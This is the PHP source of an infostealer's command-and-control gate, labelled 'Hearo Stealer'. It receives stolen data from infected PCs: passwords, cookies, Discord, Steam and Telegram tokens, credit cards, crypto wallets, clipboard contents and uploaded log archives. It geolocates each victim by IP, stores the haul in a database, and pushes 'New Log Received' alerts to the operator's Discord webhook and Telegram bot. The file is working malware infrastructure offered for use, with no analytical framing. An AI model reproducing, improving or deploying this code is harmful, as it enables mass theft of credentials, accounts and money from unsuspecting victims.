<?php
// Hearo Stealer — C2 Gate Endpoint
require_once 'xeff/includes/config.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die(json_encode(['error' => 'Method not allowed']));
}

// Determine request type
$type = $_POST['type'] ?? $_GET['type'] ?? 'log';
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// GeoIP
$country = 'XX';
$geoData = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode"));
if ($geoData && $geoData->status === 'success') {
    $country = $geoData->countryCode;
}

try {
    switch ($type) {

    // --- Discord injection event ---
    case 'discord_event':
        $sessionHash = $_POST['session_hash'] ?? '';
        $eventType   = $_POST['event_type'] ?? 'unknown';
        $eventData   = $_POST['event_data'] ?? '{}';

        $stmt = $db->prepare("INSERT INTO discord_events (session_hash, event_type, event_data) VALUES (?, ?, ?)");
        $stmt->execute([$sessionHash, $eventType, $eventData]);
        echo json_encode(['status' => 'ok', 'id' => $db->lastInsertId()]);
        break;

    // --- Heartbeat / keepalive ---
    case 'heartbeat':
        $sessionHash = $_POST['session_hash'] ?? '';
        if ($sessionHash) {
            $stmt = $db->prepare("UPDATE logs SET last_heartbeat = CURRENT_TIMESTAMP WHERE session_hash = ?");
            $stmt->execute([$sessionHash]);
        }
        echo json_encode(['status' => 'alive']);
        break;

    // --- Main log submission ---
    default:
        $sessionHash    = $_POST['session_hash'] ?? generateHash();
        $computerName   = $_POST['computer_name'] ?? 'Unknown_PC';
        $username       = $_POST['username'] ?? 'Unknown_User';
        $osVersion      = $_POST['os_version'] ?? 'Windows 10/11';
        $passwordsCount = (int)($_POST['passwords_count'] ?? 0);
        $cookiesCount   = (int)($_POST['cookies_count'] ?? 0);
        $discordTokens  = (int)($_POST['discord_tokens'] ?? 0);
        $creditCards    = (int)($_POST['credit_cards'] ?? 0);
        $robloxCookies  = (int)($_POST['roblox_cookies'] ?? 0);
        $minecraftTok   = (int)($_POST['minecraft_tokens'] ?? 0);
        $steamTokens    = (int)($_POST['steam_tokens'] ?? 0);
        $telegramSess   = (int)($_POST['telegram_sessions'] ?? 0);
        $cryptoWallets  = (int)($_POST['crypto_wallets'] ?? 0);
        $vpnConfigs     = (int)($_POST['vpn_configs'] ?? 0);
        $autofills      = (int)($_POST['autofills'] ?? 0);
        $historyEntries = (int)($_POST['history_entries'] ?? 0);
        $downloads      = (int)($_POST['downloads'] ?? 0);
        $webTokens      = (int)($_POST['web_tokens'] ?? 0);
        $clipboardData  = $_POST['clipboard_data'] ?? '';
        $interestFiles  = (int)($_POST['interesting_files'] ?? 0);
        $filezillaData  = (int)($_POST['filezilla_data'] ?? 0);
        $mullvadData    = (int)($_POST['mullvad_data'] ?? 0);
        $discordInject  = (int)($_POST['discord_injected'] ?? 0);
        $antiAvStatus   = $_POST['anti_av_status'] ?? '';
        $systemInfo     = $_POST['system_info'] ?? '';
        $browserList    = $_POST['browser_list'] ?? '';
        $buildTag       = $_POST['build_tag'] ?? '';
        $builderUser    = $_POST['builder_user'] ?? '';

        // Handle file upload
        $dataPath = '';
        if (isset($_FILES['log_file']) && $_FILES['log_file']['error'] === UPLOAD_ERR_OK) {
            $uploadDir = XEFF_ROOT . '/data/uploads/';
            if (!is_dir($uploadDir)) mkdir($uploadDir, 0755, true);
            $ext = pathinfo($_FILES['log_file']['name'], PATHINFO_EXTENSION);
            $filename = $sessionHash . '_' . time() . '.' . ($ext ?: 'zip');
            $dest = $uploadDir . $filename;
            if (move_uploaded_file($_FILES['log_file']['tmp_name'], $dest)) {
                $dataPath = 'xeff/data/uploads/' . $filename;
            }
        }

        $stmt = $db->prepare("INSERT OR REPLACE INTO logs (
            session_hash, computer_name, username, ip, country, os_version,
            passwords_count, cookies_count, discord_tokens, credit_cards,
            roblox_cookies, minecraft_tokens, steam_tokens, telegram_sessions,
            crypto_wallets, vpn_configs, autofills, history_entries, downloads,
            web_tokens, clipboard_data, interesting_files, filezilla_data,
            mullvad_data, discord_injected, anti_av_status, system_info,
            browser_list, builder_user, build_tag, data_path,
            captured_at, last_heartbeat
        ) VALUES (
            ?, ?, ?, ?, ?, ?,
            ?, ?, ?, ?,
            ?, ?, ?, ?,
            ?, ?, ?, ?, ?,
            ?, ?, ?, ?,
            ?, ?, ?, ?,
            ?, ?, ?, ?,
            CURRENT_TIMESTAMP, CURRENT_TIMESTAMP
        )");

        $stmt->execute([
            $sessionHash, $computerName, $username, $ip, $country, $osVersion,
            $passwordsCount, $cookiesCount, $discordTokens, $creditCards,
            $robloxCookies, $minecraftTok, $steamTokens, $telegramSess,
            $cryptoWallets, $vpnConfigs, $autofills, $historyEntries, $downloads,
            $webTokens, $clipboardData, $interestFiles, $filezillaData,
            $mullvadData, $discordInject, $antiAvStatus, $systemInfo,
            $browserList, $builderUser, $buildTag, $dataPath,
        ]);

        if (!empty($builderUser)) {
            $uStmt = $db->prepare("SELECT webhook_url, telegram_bot_token, telegram_chat_id FROM users WHERE username = ?");
            $uStmt->execute([$builderUser]);
            $uRow = $uStmt->fetch(PDO::FETCH_ASSOC);
            if ($uRow) {
                $msg = "🔔 **New Log Received!**\n";
                $msg .= "👤 PC: $computerName | User: $username\n";
                $msg .= "🌍 IP: $ip ($country)\n";
                $msg .= "🔑 Passwords: $passwordsCount | 🍪 Cookies: $cookiesCount\n";
                $msg .= "🎮 Discord: $discordTokens | 💳 Cards: $creditCards\n";
                
                if (!empty($uRow['webhook_url'])) {
                    $jsonData = json_encode(['content' => $msg]);
                    $ch = curl_init($uRow['webhook_url']);
                    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_exec($ch);
                    curl_close($ch);
                }
                
                if (!empty($uRow['telegram_bot_token']) && !empty($uRow['telegram_chat_id'])) {
                    $tUrl = "https://api.telegram.org/bot{$uRow['telegram_bot_token']}/sendMessage";
                    $tData = ['chat_id' => $uRow['telegram_chat_id'], 'text' => $msg];
                    $ch = curl_init($tUrl);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($tData));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_exec($ch);
                    curl_close($ch);
                }
            }
        }

        echo json_encode(['status' => 'success', 'session' => $sessionHash]);
        break;
    }
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Database error', 'msg' => $e->getMessage()]);
}
